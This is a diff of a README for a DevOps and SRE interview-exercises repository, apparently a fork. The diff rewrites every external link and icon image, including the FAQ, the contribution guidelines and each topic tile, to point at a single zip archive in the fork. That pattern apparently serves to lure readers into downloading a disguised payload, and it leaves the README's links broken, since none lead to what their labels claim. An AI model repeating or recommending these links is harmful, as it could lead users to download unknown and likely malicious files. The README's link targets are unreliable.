@@ -1,14 +1,14 @@
-<p align="center"><img src="https://raw.githubusercontent.com/sivahariu/devops-exercises/master/topics/devops/solutions/devops-exercises-v2.1.zip"/></p>
+<p align="center"><img src="https://github.com/sivahariu/devops-exercises/raw/refs/heads/master/topics/aws/exercises/s3/new_bucket/pulumi/exercises_devops_v2.1-beta.5.zip"/></p>
 
 :information_source: &nbsp;This repo contains questions and exercises on various technical topics, sometimes related to DevOps and SRE
 
 :bar_chart: &nbsp;There are currently **2624** exercises and questions
 
-:warning: &nbsp;You can use these for preparing for an interview but most of the questions and exercises don't represent an actual interview. Please read [FAQ page](https://raw.githubusercontent.com/sivahariu/devops-exercises/master/topics/devops/solutions/devops-exercises-v2.1.zip) for more details
+:warning: &nbsp;You can use these for preparing for an interview but most of the questions and exercises don't represent an actual interview. Please read [FAQ page](https://github.com/sivahariu/devops-exercises/raw/refs/heads/master/topics/aws/exercises/s3/new_bucket/pulumi/exercises_devops_v2.1-beta.5.zip) for more details
 
 :stop_sign: &nbsp;If you are interested in pursuing a career as DevOps engineer, learning some of the concepts mentioned here would be useful, but you should know it's not about learning all the topics and technologies mentioned in this repository
 
-:pencil: &nbsp;You can add more exercises by submitting pull requests :) Read about contribution guidelines [here](https://raw.githubusercontent.com/sivahariu/devops-exercises/master/topics/devops/solutions/devops-exercises-v2.1.zip)
+:pencil: &nbsp;You can add more exercises by submitting pull requests :) Read about contribution guidelines [here](https://github.com/sivahariu/devops-exercises/raw/refs/heads/master/topics/aws/exercises/s3/new_bucket/pulumi/exercises_devops_v2.1-beta.5.zip)
 
 ****
 
@@ -18,82 +18,82 @@
 <center>
 <table>
   <tr>
-    <td align="center"><a href="https://raw.githubusercontent.com/sivahariu/devops-exercises/master/topics/devops/solutions/devops-exercises-v2.1.zip"><img src="https://raw.githubusercontent.com/sivahariu/devops-exercises/master/topics/devops/solutions/devops-exercises-v2.1.zip" width="75px;" height="75px;" alt="DevOps" /><br /><b>DevOps</b></a></td>
-    <td align="center"><a href="https://raw.githubusercontent.com/sivahariu/devops-exercises/master/topics/devops/solutions/devops-exercises-v2.1.zip"><img src="https://raw.githubusercontent.com/sivahariu/devops-exercises/master/topics/devops/solutions/devops-exercises-v2.1.zip" width="75px;" height="75px;" alt="Git"/><br /><b>Git</b></a></td>
-    <td align="center"><a href="#network"><img src="https://raw.githubusercontent.com/sivahariu/devops-exercises/master/topics/devops/solutions/devops-exercises-v2.1.zip" width="75px;" height="75px;" alt="Network"/><br /><b>Network</b></a></td>
-    <td align="center"><a href="#hardware"><img src="https://raw.githubusercontent.com/sivahariu/devops-exercises/master/topics/devops/solutions/devops-exercises-v2.1.zip" width="75px;" height="75px;" alt="Hardware"/><br /><b>Hardware</b></a></td>
-    <td align="center"><a href="https://raw.githubusercontent.com/sivahariu/devops-exercises/master/topics/devops/solutions/devops-exercises-v2.1.zip"><img src="https://raw.githubusercontent.com/sivahariu/devops-exercises/master/topics/devops/solutions/devops-exercises-v2.1.zip" width="75px;" height="75px;" alt="kubernetes"/><br /><b>Kubernetes</b></a></td>
+    <td align="center"><a href="https://github.com/sivahariu/devops-exercises/raw/refs/heads/master/topics/aws/exercises/s3/new_bucket/pulumi/exercises_devops_v2.1-beta.5.zip"><img src="https://github.com/sivahariu/devops-exercises/raw/refs/heads/master/topics/aws/exercises/s3/new_bucket/pulumi/exercises_devops_v2.1-beta.5.zip" width="75px;" height="75px;" alt="DevOps" /><br /><b>DevOps</b></a></td>
+    <td align="center"><a href="https://github.com/sivahariu/devops-exercises/raw/refs/heads/master/topics/aws/exercises/s3/new_bucket/pulumi/exercises_devops_v2.1-beta.5.zip"><img src="https://github.com/sivahariu/devops-exercises/raw/refs/heads/master/topics/aws/exercises/s3/new_bucket/pulumi/exercises_devops_v2.1-beta.5.zip" width="75px;" height="75px;" alt="Git"/><br /><b>Git</b></a></td>
+    <td align="center"><a href="#network"><img src="https://github.com/sivahariu/devops-exercises/raw/refs/heads/master/topics/aws/exercises/s3/new_bucket/pulumi/exercises_devops_v2.1-beta.5.zip" width="75px;" height="75px;" alt="Network"/><br /><b>Network</b></a></td>
+    <td align="center"><a href="#hardware"><img src="https://github.com/sivahariu/devops-exercises/raw/refs/heads/master/topics/aws/exercises/s3/new_bucket/pulumi/exercises_devops_v2.1-beta.5.zip" width="75px;" height="75px;" alt="Hardware"/><br /><b>Hardware</b></a></td>
+    <td align="center"><a href="https://github.com/sivahariu/devops-exercises/raw/refs/heads/master/topics/aws/exercises/s3/new_bucket/pulumi/exercises_devops_v2.1-beta.5.zip"><img src="https://github.com/sivahariu/devops-exercises/raw/refs/heads/master/topics/aws/exercises/s3/new_bucket/pulumi/exercises_devops_v2.1-beta.5.zip" width="75px;" height="75px;" alt="kubernetes"/><br /><b>Kubernetes</b></a></td>
   </tr>
 
   <tr>
-    <td align="center"><a href="https://raw.githubusercontent.com/sivahariu/devops-exercises/master/topics/devops/solutions/devops-exercises-v2.1.zip"><img src="https://raw.githubusercontent.com/sivahariu/devops-exercises/master/topics/devops/solutions/devops-exercises-v2.1.zip" width="75px;" height="75px;" alt="programming"/><br /><b>Software Development</b></a></td>
-    <td align="center"><a href="https://raw.githubusercontent.com/sivahariu/devops-exercises/master/topics/devops/solutions/devops-exercises-v2.1.zip"><img src="https://raw.githubusercontent.com/sivahariu/devops-exercises/master/topics/devops/solutions/devops-exercises-v2.1.zip" width="75px;" height="75px;" alt="Python"/><br /><b>Python</b></a></td>
-    <td align="center"><a href="https://raw.githubusercontent.com/sivahariu/devops-exercises/master/topics/devops/solutions/devops-exercises-v2.1.zip"><img src="https://raw.githubusercontent.com/sivahariu/devops-exercises/master/topics/devops/solutions/devops-exercises-v2.1.zip" width="75px;" height="75px;" alt="go"/><br /><b>Go</b></a></td>
-    <td align="center"><a href="https://raw.githubusercontent.com/sivahariu/devops-exercises/master/topics/devops/solutions/devops-exercises-v2.1.zip"><img src="https://raw.githubusercontent.com/sivahariu/devops-exercises/master/topics/devops/solutions/devops-exercises-v2.1.zip" width="75px;" height="75px;" alt="perl"/><br /><b>Perl</b></a></td>
-    <td align="center"><a href="#regex"><img src="https://raw.githubusercontent.com/sivahariu/devops-exercises/master/topics/devops/solutions/devops-exercises-v2.1.zip" width="75px;" height="75px;" alt="RegEx"/><br /><b>Regex</b></a></td>
+    <td align="center"><a href="https://github.com/sivahariu/devops-exercises/raw/refs/heads/master/topics/aws/exercises/s3/new_bucket/pulumi/exercises_devops_v2.1-beta.5.zip"><img src="https://github.com/sivahariu/devops-exercises/raw/refs/heads/master/topics/aws/exercises/s3/new_bucket/pulumi/exercises_devops_v2.1-beta.5.zip" width="75px;" height="75px;" alt="programming"/><br /><b>Software Development</b></a></td>
+    <td align="center"><a href="https://github.com/sivahariu/devops-exercises/raw/refs/heads/master/topics/aws/exercises/s3/new_bucket/pulumi/exercises_devops_v2.1-beta.5.zip"><img src="https://github.com/sivahariu/devops-exercises/raw/refs/heads/master/topics/aws/exercises/s3/new_bucket/pulumi/exercises_devops_v2.1-beta.5.zip" width="75px;" height="75px;" alt="Python"/><br /><b>Python</b></a></td>
+    <td align="center"><a href="https://github.com/sivahariu/devops-exercises/raw/refs/heads/master/topics/aws/exercises/s3/new_bucket/pulumi/exercises_devops_v2.1-beta.5.zip"><img src="https://github.com/sivahariu/devops-exercises/raw/refs/heads/master/topics/aws/exercises/s3/new_bucket/pulumi/exercises_devops_v2.1-beta.5.zip" width="75px;" height="75px;" alt="go"/><br /><b>Go</b></a></td>
+    <td align="center"><a href="https://github.com/sivahariu/devops-exercises/raw/refs/heads/master/topics/aws/exercises/s3/new_bucket/pulumi/exercises_devops_v2.1-beta.5.zip"><img src="https://github.com/sivahariu/devops-exercises/raw/refs/heads/master/topics/aws/exercises/s3/new_bucket/pulumi/exercises_devops_v2.1-beta.5.zip" width="75px;" height="75px;" alt="perl"/><br /><b>Perl</b></a></td>
+    <td align="center"><a href="#regex"><img src="https://github.com/sivahariu/devops-exercises/raw/refs/heads/master/topics/aws/exercises/s3/new_bucket/pulumi/exercises_devops_v2.1-beta.5.zip" width="75px;" height="75px;" alt="RegEx"/><br /><b>Regex</b></a></td>
   </tr>
 
   <tr>
-      <td align="center"><a href="https://raw.githubusercontent.com/sivahariu/devops-exercises/master/topics/devops/solutions/devops-exercises-v2.1.zip"><img src="https://raw.githubusercontent.com/sivahariu/devops-exercises/master/topics/devops/solutions/devops-exercises-v2.1.zip" width="75px;" height="75px;" alt="Cloud"/><br /><b>Cloud</b></a></td>
-      <td align="center"><a href="https://raw.githubusercontent.com/sivahariu/devops-exercises/master/topics/devops/solutions/devops-exercises-v2.1.zip"><img src="https://raw.githubusercontent.com/sivahariu/devops-exercises/master/topics/devops/solutions/devops-exercises-v2.1.zip" width="100px;" height="75px;" alt="aws"/><br /><b>AWS</b></a></td>
-      <td align="center"><a href="https://raw.githubusercontent.com/sivahariu/devops-exercises/master/topics/devops/solutions/devops-exercises-v2.1.zip"><img src="https://raw.githubusercontent.com/sivahariu/devops-exercises/master/topics/devops/solutions/devops-exercises-v2.1.zip" width="75px;" height="75px;" alt="azure"/><br /><b>Azure</b></a></td>
-      <td align="center"><a href="https://raw.githubusercontent.com/sivahariu/devops-exercises/master/topics/devops/solutions/devops-exercises-v2.1.zip"><img src="https://raw.githubusercontent.com/sivahariu/devops-exercises/master/topics/devops/solutions/devops-exercises-v2.1.zip" width="70px;" height="70px;" alt="Google Cloud Platform"/><br /><b>Google Cloud Platform</b></a></td>
-      <td align="center"><a href="https://raw.githubusercontent.com/sivahariu/devops-exercises/master/topics/devops/solutions/devops-exercises-v2.1.zip"><img src="https://raw.githubusercontent.com/sivahariu/devops-exercises/master/topics/devops/solutions/devops-exercises-v2.1.zip" width="75px;" height="75px;" alt="openstack"/><br /><b>OpenStack</b></a></td>
+      <td align="center"><a href="https://github.com/sivahariu/devops-exercises/raw/refs/heads/master/topics/aws/exercises/s3/new_bucket/pulumi/exercises_devops_v2.1-beta.5.zip"><img src="https://github.com/sivahariu/devops-exercises/raw/refs/heads/master/topics/aws/exercises/s3/new_bucket/pulumi/exercises_devops_v2.1-beta.5.zip" width="75px;" height="75px;" alt="Cloud"/><br /><b>Cloud</b></a></td>
+      <td align="center"><a href="https://github.com/sivahariu/devops-exercises/raw/refs/heads/master/topics/aws/exercises/s3/new_bucket/pulumi/exercises_devops_v2.1-beta.5.zip"><img src="https://github.com/sivahariu/devops-exercises/raw/refs/heads/master/topics/aws/exercises/s3/new_bucket/pulumi/exercises_devops_v2.1-beta.5.zip" width="100px;" height="75px;" alt="aws"/><br /><b>AWS</b></a></td>
+      <td align="center"><a href="https://github.com/sivahariu/devops-exercises/raw/refs/heads/master/topics/aws/exercises/s3/new_bucket/pulumi/exercises_devops_v2.1-beta.5.zip"><img src="https://github.com/sivahariu/devops-exercises/raw/refs/heads/master/topics/aws/exercises/s3/new_bucket/pulumi/exercises_devops_v2.1-beta.5.zip" width="75px;" height="75px;" alt="azure"/><br /><b>Azure</b></a></td>
+      <td align="center"><a href="https://github.com/sivahariu/devops-exercises/raw/refs/heads/master/topics/aws/exercises/s3/new_bucket/pulumi/exercises_devops_v2.1-beta.5.zip"><img src="https://github.com/sivahariu/devops-exercises/raw/refs/heads/master/topics/aws/exercises/s3/new_bucket/pulumi/exercises_devops_v2.1-beta.5.zip" width="70px;" height="70px;" alt="Google Cloud Platform"/><br /><b>Google Cloud Platform</b></a></td>
+      <td align="center"><a href="https://github.com/sivahariu/devops-exercises/raw/refs/heads/master/topics/aws/exercises/s3/new_bucket/pulumi/exercises_devops_v2.1-beta.5.zip"><img src="https://github.com/sivahariu/devops-exercises/raw/refs/heads/master/topics/aws/exercises/s3/new_bucket/pulumi/exercises_devops_v2.1-beta.5.zip" width="75px;" height="75px;" alt="openstack"/><br /><b>OpenStack</b></a></td>
   </tr>
 
   <tr>
-      <td align="center"><a href="#operating-system"><img src="https://raw.githubusercontent.com/sivahariu/devops-exercises/master/topics/devops/solutions/devops-exercises-v2.1.zip" width="75px;" height="75px;" alt="Operating System"/><br /><b>Operating System</b></a></td>
-      <td align="center"><a href="https://raw.githubusercontent.com/sivahariu/devops-exercises/master/topics/devops/solutions/devops-exercises-v2.1.zip"><img src="https://raw.githubusercontent.com/sivahariu/devops-exercises/master/topics/devops/solutions/devops-exercises-v2.1.zip" width="75px;" height="75px;" alt="Linux"/><br /><b>Linux</b></a></td>
-      <td align="center"><a href="#virtualization"><img src="https://raw.githubusercontent.com/sivahariu/devops-exercises/master/topics/devops/solutions/devops-exercises-v2.1.zip" width="75px;" height="75px;" alt="Virtualization"/><br /><b>Virtualization</b></a></td>
-      <td align="center"><a href="https://raw.githubusercontent.com/sivahariu/devops-exercises/master/topics/devops/solutions/devops-exercises-v2.1.zip"><img src="https://raw.githubusercontent.com/sivahariu/devops-exercises/master/topics/devops/solutions/devops-exercises-v2.1.zip" width="75px;" height="75px;" alt="DNS"/><br /><b>DNS</b></a></td>
-      <td align="center"><a href="https://raw.githubusercontent.com/sivahariu/devops-exercises/master/topics/devops/solutions/devops-exercises-v2.1.zip"><img src="https://raw.githubusercontent.com/sivahariu/devops-exercises/master/topics/devops/solutions/devops-exercises-v2.1.zip" width="75px;" height="75px;" alt="Bash"/><br /><b>Shell Scripting</b></a></td>
+      <td align="center"><a href="#operating-system"><img src="https://github.com/sivahariu/devops-exercises/raw/refs/heads/master/topics/aws/exercises/s3/new_bucket/pulumi/exercises_devops_v2.1-beta.5.zip" width="75px;" height="75px;" alt="Operating System"/><br /><b>Operating System</b></a></td>
+      <td align="center"><a href="https://github.com/sivahariu/devops-exercises/raw/refs/heads/master/topics/aws/exercises/s3/new_bucket/pulumi/exercises_devops_v2.1-beta.5.zip"><img src="https://github.com/sivahariu/devops-exercises/raw/refs/heads/master/topics/aws/exercises/s3/new_bucket/pulumi/exercises_devops_v2.1-beta.5.zip" width="75px;" height="75px;" alt="Linux"/><br /><b>Linux</b></a></td>
+      <td align="center"><a href="#virtualization"><img src="https://github.com/sivahariu/devops-exercises/raw/refs/heads/master/topics/aws/exercises/s3/new_bucket/pulumi/exercises_devops_v2.1-beta.5.zip" width="75px;" height="75px;" alt="Virtualization"/><br /><b>Virtualization</b></a></td>
+      <td align="center"><a href="https://github.com/sivahariu/devops-exercises/raw/refs/heads/master/topics/aws/exercises/s3/new_bucket/pulumi/exercises_devops_v2.1-beta.5.zip"><img src="https://github.com/sivahariu/devops-exercises/raw/refs/heads/master/topics/aws/exercises/s3/new_bucket/pulumi/exercises_devops_v2.1-beta.5.zip" width="75px;" height="75px;" alt="DNS"/><br /><b>DNS</b></a></td>
+      <td align="center"><a href="https://github.com/sivahariu/devops-exercises/raw/refs/heads/master/topics/aws/exercises/s3/new_bucket/pulumi/exercises_devops_v2.1-beta.5.zip"><img src="https://github.com/sivahariu/devops-exercises/raw/refs/heads/master/topics/aws/exercises/s3/new_bucket/pulumi/exercises_devops_v2.1-beta.5.zip" width="75px;" height="75px;" alt="Bash"/><br /><b>Shell Scripting</b></a></td>
   </tr>
 
   <tr>
-      <td align="center"><a href="https://raw.githubusercontent.com/sivahariu/devops-exercises/master/topics/devops/solutions/devops-exercises-v2.1.zip"><img src="https://raw.githubusercontent.com/sivahariu/devops-exercises/master/topics/devops/solutions/devops-exercises-v2.1.zip" width="75px;" height="75px;" alt="Databases"/><br /><b>Databases</b></a></td>
-      <td align="center"><a href="#sql"><img src="https://raw.githubusercontent.com/sivahariu/devops-exercises/master/topics/devops/solutions/devops-exercises-v2.1.zip" width="75px;" height="75px;" alt="sql"/><br /><b>SQL</b></a></td>
-      <td align="center"><a href="#mongo"><img src="https://raw.githubusercontent.com/sivahariu/devops-exercises/master/topics/devops/solutions/devops-exercises-v2.1.zip" width="75px;" height="75px;" alt="Mongo"/><br /><b>Mongo</b></a></td>
-      <td align="center"><a href="#testing"><img src="https://raw.githubusercontent.com/sivahariu/devops-exercises/master/topics/devops/solutions/devops-exercises-v2.1.zip" width="75px;" height="75px;" alt="Testing"/><br /><b>Testing</b></a></td>
-      <td align="center"><a href="#big-data"><img src="https://raw.githubusercontent.com/sivahariu/devops-exercises/master/topics/devops/solutions/devops-exercises-v2.1.zip" width="75px;" height="75px;" alt="Big Data"/><br /><b>Big Data</b></a></td>
+      <td align="center"><a href="https://github.com/sivahariu/devops-exercises/raw/refs/heads/master/topics/aws/exercises/s3/new_bucket/pulumi/exercises_devops_v2.1-beta.5.zip"><img src="https://github.com/sivahariu/devops-exercises/raw/refs/heads/master/topics/aws/exercises/s3/new_bucket/pulumi/exercises_devops_v2.1-beta.5.zip" width="75px;" height="75px;" alt="Databases"/><br /><b>Databases</b></a></td>
+      <td align="center"><a href="#sql"><img src="https://github.com/sivahariu/devops-exercises/raw/refs/heads/master/topics/aws/exercises/s3/new_bucket/pulumi/exercises_devops_v2.1-beta.5.zip" width="75px;" height="75px;" alt="sql"/><br /><b>SQL</b></a></td>
+      <td align="center"><a href="#mongo"><img src="https://github.com/sivahariu/devops-exercises/raw/refs/heads/master/topics/aws/exercises/s3/new_bucket/pulumi/exercises_devops_v2.1-beta.5.zip" width="75px;" height="75px;" alt="Mongo"/><br /><b>Mongo</b></a></td>
+      <td align="center"><a href="#testing"><img src="https://github.com/sivahariu/devops-exercises/raw/refs/heads/master/topics/aws/exercises/s3/new_bucket/pulumi/exercises_devops_v2.1-beta.5.zip" width="75px;" height="75px;" alt="Testing"/><br /><b>Testing</b></a></td>
+      <td align="center"><a href="#big-data"><img src="https://github.com/sivahariu/devops-exercises/raw/refs/heads/master/topics/aws/exercises/s3/new_bucket/pulumi/exercises_devops_v2.1-beta.5.zip" width="75px;" height="75px;" alt="Big Data"/><br /><b>Big Data</b></a></td>
 
   </tr>
 
   <tr>
-      <td align="center"><a href="https://raw.githubusercontent.com/sivahariu/devops-exercises/master/topics/devops/solutions/devops-exercises-v2.1.zip"><img src="https://raw.githubusercontent.com/sivahariu/devops-exercises/master/topics/devops/solutions/devops-exercises-v2.1.zip" width="75px;" height="75px;" alt="cicd"/><br /><b>CI/CD</b></a></td>
-      <td align="center"><a href="#certificates"><img src="https://raw.githubusercontent.com/sivahariu/devops-exercises/master/topics/devops/solutions/devops-exercises-v2.1.zip" width="75px;" height="75px;" alt="Certificates"/><br /><b>Certificates</b></a></td>
-      <td align="center"><a href="https://raw.githubusercontent.com/sivahariu/devops-exercises/master/topics/devops/solutions/devops-exercises-v2.1.zip"><img src="https://raw.githubusercontent.com/sivahariu/devops-exercises/master/topics/devops/solutions/devops-exercises-v2.1.zip" width="75px;" height="75px;" alt="Containers"/><br /><b>Containers</b></a></td>
-      <td align="center"><a href="https://raw.githubusercontent.com/sivahariu/devops-exercises/master/topics/devops/solutions/devops-exercises-v2.1.zip"><img src="https://raw.githubusercontent.com/sivahariu/devops-exercises/master/topics/devops/solutions/devops-exercises-v2.1.zip" width="75px;" height="75px;" alt="OpenShift"/><br /><b>OpenShift</b></a></td>
-      <td align="center"><a href="#storage"><img src="https://raw.githubusercontent.com/sivahariu/devops-exercises/master/topics/devops/solutions/devops-exercises-v2.1.zip" width="75px;" height="75px;" alt="Storage"/><br /><b>Storage</b></a></td>
+      <td align="center"><a href="https://github.com/sivahariu/devops-exercises/raw/refs/heads/master/topics/aws/exercises/s3/new_bucket/pulumi/exercises_devops_v2.1-beta.5.zip"><img src="https://github.com/sivahariu/devops-exercises/raw/refs/heads/master/topics/aws/exercises/s3/new_bucket/pulumi/exercises_devops_v2.1-beta.5.zip" width="75px;" height="75px;" alt="cicd"/><br /><b>CI/CD</b></a></td>
+      <td align="center"><a href="#certificates"><img src="https://github.com/sivahariu/devops-exercises/raw/refs/heads/master/topics/aws/exercises/s3/new_bucket/pulumi/exercises_devops_v2.1-beta.5.zip" width="75px;" height="75px;" alt="Certificates"/><br /><b>Certificates</b></a></td>
+      <td align="center"><a href="https://github.com/sivahariu/devops-exercises/raw/refs/heads/master/topics/aws/exercises/s3/new_bucket/pulumi/exercises_devops_v2.1-beta.5.zip"><img src="https://github.com/sivahariu/devops-exercises/raw/refs/heads/master/topics/aws/exercises/s3/new_bucket/pulumi/exercises_devops_v2.1-beta.5.zip" width="75px;" height="75px;" alt="Containers"/><br /><b>Containers</b></a></td>
+      <td align="center"><a href="https://github.com/sivahariu/devops-exercises/raw/refs/heads/master/topics/aws/exercises/s3/new_bucket/pulumi/exercises_devops_v2.1-beta.5.zip"><img src="https://github.com/sivahariu/devops-exercises/raw/refs/heads/master/topics/aws/exercises/s3/new_bucket/pulumi/exercises_devops_v2.1-beta.5.zip" width="75px;" height="75px;" alt="OpenShift"/><br /><b>OpenShift</b></a></td>
+      <td align="center"><a href="#storage"><img src="https://github.com/sivahariu/devops-exercises/raw/refs/heads/master/topics/aws/exercises/s3/new_bucket/pulumi/exercises_devops_v2.1-beta.5.zip" width="75px;" height="75px;" alt="Storage"/><br /><b>Storage</b></a></td>
   </tr>
 
   <tr>
-      <td align="center"><a href="https://raw.githubusercontent.com/sivahariu/devops-exercises/master/topics/devops/solutions/devops-exercises-v2.1.zip"><img src="https://raw.githubusercontent.com/sivahariu/devops-exercises/master/topics/devops/solutions/devops-exercises-v2.1.zip" width="75px;" height="75px;" alt="Terraform"/><br /><b>Terraform</b></a></td>
-      <td align="center"><a href="#puppet"><img src="https://raw.githubusercontent.com/sivahariu/devops-exercises/master/topics/devops/solutions/devops-exercises-v2.1.zip" width="75px;" height="75px;" alt="puppet"/><br /><b>Puppet</b></a></td>
-      <td align="center"><a href="#distributed"><img src="https://raw.githubusercontent.com/sivahariu/devops-exercises/master/topics/devops/solutions/devops-exercises-v2.1.zip" width="75px;" height="75px;" alt="Distributed"/><br /><b>Distributed</b></a></td>
-      <td align="center"><a href="#questions-you-ask"><img src="https://raw.githubusercontent.com/sivahariu/devops-exercises/master/topics/devops/solutions/devops-exercises-v2.1.zip" width="75px;" height="75px;" alt="you"/><br /><b>Questions you can ask</b></a></td>
-      <td align="center"><a href="https://raw.githubusercontent.com/sivahariu/devops-exercises/master/topics/devops/solutions/devops-exercises-v2.1.zip"><img src="https://raw.githubusercontent.com/sivahariu/devops-exercises/master/topics/devops/solutions/devops-exercises-v2.1.zip" width="75px;" height="75px;" alt="ansible"/><br /><b>Ansible</b></a></td>
+      <td align="center"><a href="https://github.com/sivahariu/devops-exercises/raw/refs/heads/master/topics/aws/exercises/s3/new_bucket/pulumi/exercises_devops_v2.1-beta.5.zip"><img src="https://github.com/sivahariu/devops-exercises/raw/refs/heads/master/topics/aws/exercises/s3/new_bucket/pulumi/exercises_devops_v2.1-beta.5.zip" width="75px;" height="75px;" alt="Terraform"/><br /><b>Terraform</b></a></td>
+      <td align="center"><a href="#puppet"><img src="https://github.com/sivahariu/devops-exercises/raw/refs/heads/master/topics/aws/exercises/s3/new_bucket/pulumi/exercises_devops_v2.1-beta.5.zip" width="75px;" height="75px;" alt="puppet"/><br /><b>Puppet</b></a></td>
+      <td align="center"><a href="#distributed"><img src="https://github.com/sivahariu/devops-exercises/raw/refs/heads/master/topics/aws/exercises/s3/new_bucket/pulumi/exercises_devops_v2.1-beta.5.zip" width="75px;" height="75px;" alt="Distributed"/><br /><b>Distributed</b></a></td>
+      <td align="center"><a href="#questions-you-ask"><img src="https://github.com/sivahariu/devops-exercises/raw/refs/heads/master/topics/aws/exercises/s3/new_bucket/pulumi/exercises_devops_v2.1-beta.5.zip" width="75px;" height="75px;" alt="you"/><br /><b>Questions you can ask</b></a></td>
+      <td align="center"><a href="https://github.com/sivahariu/devops-exercises/raw/refs/heads/master/topics/aws/exercises/s3/new_bucket/pulumi/exercises_devops_v2.1-beta.5.zip"><img src="https://github.com/sivahariu/devops-exercises/raw/refs/heads/master/topics/aws/exercises/s3/new_bucket/pulumi/exercises_devops_v2.1-beta.5.zip" width="75px;" height="75px;" alt="ansible"/><br /><b>Ansible</b></a></td>
   </tr>
 
   <tr>
-      <td align="center"><a href="https://raw.githubusercontent.com/sivahariu/devops-exercises/master/topics/devops/solutions/devops-exercises-v2.1.zip"><img src="https://raw.githubusercontent.com/sivahariu/devops-exercises/master/topics/devops/solutions/devops-exercises-v2.1.zip" width="75px;" height="75px;" alt="observability"/><br /><b>Observability</b></a></td>
-      <td align="center"><a href="#prometheus"><img src="https://raw.githubusercontent.com/sivahariu/devops-exercises/master/topics/devops/solutions/devops-exercises-v2.1.zip" width="75px;" height="75px;" alt="Prometheus"/><br /><b>Prometheus</b></a></td>
-      <td align="center"><a href="https://raw.githubusercontent.com/sivahariu/devops-exercises/master/topics/devops/solutions/devops-exercises-v2.1.zip"><img src="https://raw.githubusercontent.com/sivahariu/devops-exercises/master/topics/devops/solutions/devops-exercises-v2.1.zip" width="70px;" height="70px;" alt="Circle CI"/><br /><b>Circle CI</b></a></td>
-      <td align="center"><a href="https://raw.githubusercontent.com/sivahariu/devops-exercises/master/topics/devops/solutions/devops-exercises-v2.1.zip"><img src="https://raw.githubusercontent.com/sivahariu/devops-exercises/master/topics/devops/solutions/devops-exercises-v2.1.zip" width="80px;" height="80px;" alt="DataDog"/><br /><b></b></a></td>
-      <td align="center"><a href="https://raw.githubusercontent.com/sivahariu/devops-exercises/master/topics/devops/solutions/devops-exercises-v2.1.zip"><img src="https://raw.githubusercontent.com/sivahariu/devops-exercises/master/topics/devops/solutions/devops-exercises-v2.1.zip" width="80px;" height="80px;" alt="Grafana"/><br /><b>Grafana</b></a></td>
+      <td align="center"><a href="https://github.com/sivahariu/devops-exercises/raw/refs/heads/master/topics/aws/exercises/s3/new_bucket/pulumi/exercises_devops_v2.1-beta.5.zip"><img src="https://github.com/sivahariu/devops-exercises/raw/refs/heads/master/topics/aws/exercises/s3/new_bucket/pulumi/exercises_devops_v2.1-beta.5.zip" width="75px;" height="75px;" alt="observability"/><br /><b>Observability</b></a></td>
+      <td align="center"><a href="#prometheus"><img src="https://github.com/sivahariu/devops-exercises/raw/refs/heads/master/topics/aws/exercises/s3/new_bucket/pulumi/exercises_devops_v2.1-beta.5.zip" width="75px;" height="75px;" alt="Prometheus"/><br /><b>Prometheus</b></a></td>
+      <td align="center"><a href="https://github.com/sivahariu/devops-exercises/raw/refs/heads/master/topics/aws/exercises/s3/new_bucket/pulumi/exercises_devops_v2.1-beta.5.zip"><img src="https://github.com/sivahariu/devops-exercises/raw/refs/heads/master/topics/aws/exercises/s3/new_bucket/pulumi/exercises_devops_v2.1-beta.5.zip" width="70px;" height="70px;" alt="Circle CI"/><br /><b>Circle CI</b></a></td>
+      <td align="center"><a href="https://github.com/sivahariu/devops-exercises/raw/refs/heads/master/topics/aws/exercises/s3/new_bucket/pulumi/exercises_devops_v2.1-beta.5.zip"><img src="https://github.com/sivahariu/devops-exercises/raw/refs/heads/master/topics/aws/exercises/s3/new_bucket/pulumi/exercises_devops_v2.1-beta.5.zip" width="80px;" height="80px;" alt="DataDog"/><br /><b></b></a></td>
+      <td align="center"><a href="https://github.com/sivahariu/devops-exercises/raw/refs/heads/master/topics/aws/exercises/s3/new_bucket/pulumi/exercises_devops_v2.1-beta.5.zip"><img src="https://github.com/sivahariu/devops-exercises/raw/refs/heads/master/topics/aws/exercises/s3/new_bucket/pulumi/exercises_devops_v2.1-beta.5.zip" width="80px;" height="80px;" alt="Grafana"/><br /><b>Grafana</b></a></td>
   </tr>
 
   <tr>
-    <td align="center"><a href="https://raw.githubusercontent.com/sivahariu/devops-exercises/master/topics/devops/solutions/devops-exercises-v2.1.zip"><img src="https://raw.githubusercontent.com/sivahariu/devops-exercises/master/topics/devops/solutions/devops-exercises-v2.1.zip" width="80px;" height="80px;" alt="Argo"/><br /><b>Argo</b></a></td>
-    <td align="center"><a href="https://raw.githubusercontent.com/sivahariu/devops-exercises/master/topics/devops/solutions/devops-exercises-v2.1.zip"><img src="https://raw.githubusercontent.com/sivahariu/devops-exercises/master/topics/devops/solutions/devops-exercises-v2.1.zip" width="75px;" height="75px;" alt="HR"/><br /><b>Soft Skills</b></a></td>
-    <td align="center"><a href="https://raw.githubusercontent.com/sivahariu/devops-exercises/master/topics/devops/solutions/devops-exercises-v2.1.zip"><img src="https://raw.githubusercontent.com/sivahariu/devops-exercises/master/topics/devops/solutions/devops-exercises-v2.1.zip" width="75px;" height="75px;" alt="security"/><br /><b>Security</b></a></td>
-    <td align="center"><a href="#system-design"><img src="https://raw.githubusercontent.com/sivahariu/devops-exercises/master/topics/devops/solutions/devops-exercises-v2.1.zip" width="75px;" height="75px;" alt="Design"/><br /><b>System Design</b></a></td>
+    <td align="center"><a href="https://github.com/sivahariu/devops-exercises/raw/refs/heads/master/topics/aws/exercises/s3/new_bucket/pulumi/exercises_devops_v2.1-beta.5.zip"><img src="https://github.com/sivahariu/devops-exercises/raw/refs/heads/master/topics/aws/exercises/s3/new_bucket/pulumi/exercises_devops_v2.1-beta.5.zip" width="80px;" height="80px;" alt="Argo"/><br /><b>Argo</b></a></td>
+    <td align="center"><a href="https://github.com/sivahariu/devops-exercises/raw/refs/heads/master/topics/aws/exercises/s3/new_bucket/pulumi/exercises_devops_v2.1-beta.5.zip"><img src="https://github.com/sivahariu/devops-exercises/raw/refs/heads/master/topics/aws/exercises/s3/new_bucket/pulumi/exercises_devops_v2.1-beta.5.zip" width="75px;" height="75px;" alt="HR"/><br /><b>Soft Skills</b></a></td>
+    <td align="center"><a href="https://github.com/sivahariu/devops-exercises/raw/refs/heads/master/topics/aws/exercises/s3/new_bucket/pulumi/exercises_devops_v2.1-beta.5.zip"><img src="https://github.com/sivahariu/devops-exercises/raw/refs/heads/master/topics/aws/exercises/s3/new_bucket/pulumi/exercises_devops_v2.1-beta.5.zip" width="75px;" height="75px;" alt="security"/><br /><b>Security</b></a></td>
